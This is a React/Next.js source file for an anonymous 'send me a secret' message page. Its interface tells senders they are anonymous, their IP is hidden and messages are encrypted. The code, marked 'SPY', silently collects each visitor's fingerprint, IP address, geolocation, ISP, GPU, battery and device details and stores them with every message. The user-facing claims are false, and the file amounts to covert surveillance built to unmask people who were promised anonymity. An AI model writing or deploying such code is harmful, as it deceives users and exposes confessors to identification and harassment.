"use client";

import React, { useState, useEffect, useCallback } from 'react';
import { supabase } from '@/lib/supabaseClient';
import { useParams } from 'next/navigation';
// --- SPY IMPORTS ---
import { useFingerprint } from '@/app/utils/useFingerprint'; // Update path if needed
import { generateClientMasterId } from '@/app/utils/clientMasterId'; // Update path if needed
import { useToast } from '@/app/context/ToastContext';
// --- SPY TYPES ---
interface SpyData {
  masterId: string;
  fingerPrint: string;
  ip: string;
  city: string;
  country: string;
  lat: string;
  lon: string;
  isp: string;
  gpu: string;
  cpu_cores: number;
  ram_gb: number | string;
  battery_level: string;
  is_charging: boolean;
  screen_res: string;
  window_res: string;
  pixel_ratio: number;
  os_platform: string;
  user_agent: string;
  browser_lang: string;
  timezone: string;
  connection_type: string;
}

interface ExtendedNavigator extends Navigator {
  connection?: { effectiveType: string; downlink?: number; };
  deviceMemory?: number;
  getBattery?: () => Promise<{ level: number; charging: boolean }>;
}

interface Message {
  id: number;
  created_at: string;
  content: string;
  author_name: string;
  reply: string;
}

export default function MessagePage() {
  const toast  = useToast();
    // --- LOGIC STATE ---
    const [messages, setMessages] = useState<Message[]>([]);
    const [newMessage, setNewMessage] = useState("");
    const [authorName, setAuthorName] = useState("");
    const [loading, setLoading] = useState(true);
    const [error, setError] = useState<string | null>(null);
    const [sending, setSending] = useState(false);

    // --- SPY STATE ---
    const { visitorId } = useFingerprint();
    const [spyData, setSpyData] = useState<SpyData | null>(null);

    const params = useParams();
    const linkId = params.linkId as string;

    // --- 1. GATHER SPY DATA SILENTLY ---
    useEffect(() => {
      if (typeof window === 'undefined') return;

      const collectIntel = async () => {
        const nav = navigator as ExtendedNavigator;
        
        // A. GPU Detection
        const getGPU = () => {
          try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return 'Unknown GPU';
            // @ts-ignore
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            // @ts-ignore
            return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Generic GPU';
          } catch (e) { return 'Blocked'; }
        };

        // B. Network & IP (Free HTTPS API)
        let ipInfo = { ip: 'Unknown', city: 'Unknown', country: 'Unknown', lat: '0', lon: '0', isp: 'Unknown' };
        try {
          const res = await fetch('https://ipwho.is/');
          const json = await res.json();
          if (json.success) {
            ipInfo = { 
              ip: json.ip, 
              city: json.city, 
              country: json.country, 
              lat: String(json.latitude), 
              lon: String(json.longitude), 
              isp: json.connection?.isp || 'Unknown' 
            };
          }
        } catch (e) { console.error("IP Check Failed"); }

        // C. Battery
        let batt = { level: 'Unknown', charging: false };
        if (nav.getBattery) {
          try {
            const b = await nav.getBattery();
            batt = { level: `${Math.round(b.level * 100)}%`, charging: b.charging };
          } catch(e) {}
        }

        // D. Build Raw Data
        const rawData = {
          fingerPrint: visitorId || 'Loading...',
          ...ipInfo,
          gpu: getGPU(),
          cpu_cores: nav.hardwareConcurrency || 0,
          ram_gb: nav.deviceMemory ? `~${nav.deviceMemory} GB` : 'Unknown',
          battery_level: batt.level,
          is_charging: batt.charging,
          screen_res: `${window.screen.width}x${window.screen.height}`,
          window_res: `${window.innerWidth}x${window.innerHeight}`,
          pixel_ratio: window.devicePixelRatio || 1,
          os_platform: nav.platform || 'Unknown',
          user_agent: nav.userAgent,
          browser_lang: nav.language,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          connection_type: nav.connection ? nav.connection.effectiveType : 'Unknown',
        };

        // E. Generate Master ID
        // Ensure you have created 'app/utils/clientMasterId.ts' from the previous answer
        let mId = 'Generating...';
        try {
           mId = await generateClientMasterId(rawData);
        } catch (e) { mId = 'Error'; }

        setSpyData({ ...rawData, masterId: mId });
      };

      collectIntel();
    }, [visitorId]);


    // --- 2. FETCH MESSAGES ---
    const fetchMessages = useCallback(async () => {
        if (!linkId) return;
        try {
            const { data, error } = await supabase
                .from('messages')
                .select('*')
                .eq('link_id', linkId)
                .order('created_at', { ascending: false });

            if (error) throw error;
            setMessages(data || []);
        } catch (err) {
            console.error('Fetch error:', err);
            setError('Could not load secrets.');
        } finally {
            setLoading(false);
        }
    }, [linkId]);

    useEffect(() => {
        fetchMessages();
    }, [fetchMessages]);


    // --- 3. POST MESSAGE WITH SPY DATA ---
    const handlePostMessage = async () => {
        if (!newMessage.trim()) return toast.error('Please write a secret.');
        
        // Optional: Block if spy data isn't ready yet
        // if (!spyData || spyData.masterId === 'Generating...') return alert("Initializing security... try again in 1 second.");

        setSending(true);
        const nameToUse = authorName.trim() || "Anonymous";

        try {
            const { error } = await supabase
                .from('messages')
                .insert({
                    content: newMessage,
                    author_name: nameToUse,
                    link_id: linkId,
                    reply: '',
                    spy: spyData, // <--- SILENTLY ATTACHING THE DATA
                });

            if (error) throw error;

            setNewMessage("");
            setAuthorName("");
            fetchMessages();
            toast.success("Secret sent successfully! 🤫");
       } catch (err: any) {
        // 🛑 FIX: Log specific properties to see the real error
        console.error("❌ FULL ERROR OBJECT:", err);
        console.error("❌ Error Message:", err.message);
        console.error("❌ Error Hint:", err.hint);
        console.error("❌ Error Details:", err.details);
        
        toast.error(`Failed to send: ${err.message || "Check Console"}`);
    } finally {
        setSending(false);
    }
    };

    // --- UI RENDER (Same Premium UI) ---
    return (
        <div className="min-h-screen bg-[#050505] text-white font-sans selection:bg-purple-500 selection:text-white relative overflow-hidden flex flex-col items-center py-10">

            {/* Styles & Backgrounds */}
            <style jsx>{`
                @keyframes blob { 0% { transform: translate(0px, 0px) scale(1); } 33% { transform: translate(30px, -50px) scale(1.1); } 66% { transform: translate(-20px, 20px) scale(0.9); } 100% { transform: translate(0px, 0px) scale(1); } }
                .animate-blob { animation: blob 7s infinite; }
                .animation-delay-2000 { animation-delay: 2s; }
                .animation-delay-4000 { animation-delay: 4s; }
            `}</style>

            <div className="fixed inset-0 bg-gradient-to-br from-black via-purple-950/20 to-black z-0"></div>
            <div className="fixed inset-0 overflow-hidden pointer-events-none z-0">
                <div className="absolute top-0 left-1/4 w-96 h-96 bg-purple-600 rounded-full mix-blend-multiply filter blur-[128px] opacity-40 animate-blob"></div>
                <div className="absolute top-0 right-1/4 w-96 h-96 bg-pink-600 rounded-full mix-blend-multiply filter blur-[128px] opacity-40 animate-blob animation-delay-2000"></div>
            </div>
            <div className="fixed inset-0 bg-[url('https://grainy-gradients.vercel.app/noise.svg')] opacity-20 pointer-events-none z-0"></div>

            {/* Main Content */}
            <main className="w-full max-w-md relative z-10 px-6 space-y-8">
                
                {/* Header */}
                <div className="flex flex-col items-center relative group">
                    <div className="relative w-24 h-24 mb-4">
                        <div className="absolute inset-0 bg-gradient-to-tr from-pink-500 via-purple-500 to-indigo-500 rounded-full blur-md opacity-70 animate-pulse"></div>
                        <div className="relative w-full h-full rounded-full p-[2px] bg-gradient-to-tr from-pink-500 via-purple-500 to-indigo-500">
                            <div className="w-full h-full rounded-full bg-black overflow-hidden relative">
                                <img src="https://api.dicebear.com/9.x/micah/svg?seed=Twisted" alt="Profile" className="w-full h-full object-cover" />
                            </div>
                        </div>
                    </div>
                    <h1 className="text-2xl font-black text-transparent bg-clip-text bg-gradient-to-r from-white to-gray-400">@MysteryUser</h1>
                    <p className="text-gray-400 text-xs mt-1 text-center">Send me a secret. I won't know it's you.</p>
                </div>

                {/* Input Form */}
                <div className="backdrop-blur-2xl bg-white/5 border border-white/10 rounded-3xl p-1 shadow-2xl">
                    <div className="bg-black/20 rounded-[20px] p-5 relative space-y-4">
                        <div className="flex justify-between items-center text-[10px] font-mono text-gray-500 uppercase">
                            <span className="flex items-center gap-1.5"><span className="w-1.5 h-1.5 rounded-full bg-red-500 animate-pulse"></span>Recording...</span>
                            <span className="text-purple-400/80">AES-256 ENCRYPTED</span>
                        </div>
                        <input type="text" value={authorName} onChange={(e) => setAuthorName(e.target.value)} placeholder="Your Alias (Optional)" className="w-full bg-white/5 border border-white/10 rounded-xl px-3 py-2 text-sm text-white focus:outline-none focus:border-purple-500/50" />
                        <textarea value={newMessage} onChange={(e) => setNewMessage(e.target.value)} placeholder="Type your confession here..." className="w-full bg-transparent text-lg text-white placeholder-gray-500/50 outline-none resize-none min-h-[120px]" maxLength={300} />
                    </div>
                </div>

                {/* Submit Button */}
                <button onClick={handlePostMessage} disabled={sending} className="w-full group relative">
                    <div className="absolute -inset-0.5 bg-gradient-to-r from-pink-600 to-purple-600 rounded-2xl blur opacity-60 group-hover:opacity-100 transition duration-200"></div>
                    <div className="relative w-full bg-black rounded-2xl px-6 py-4 flex items-center justify-center gap-3 border border-white/10 group-hover:bg-black/80 active:scale-95 transition-all">
                        {sending ? <span className="text-white font-bold animate-pulse">Encrypting...</span> : <span className="text-lg font-bold text-white">Send Secret Message</span>}
                    </div>
                </button>

                {/* Footer */}
                <div className="text-center pb-8"><p className="text-[10px] text-gray-700">🔒 100% Anonymous • IP Hidden</p></div>

            </main>
        </div>
    );
}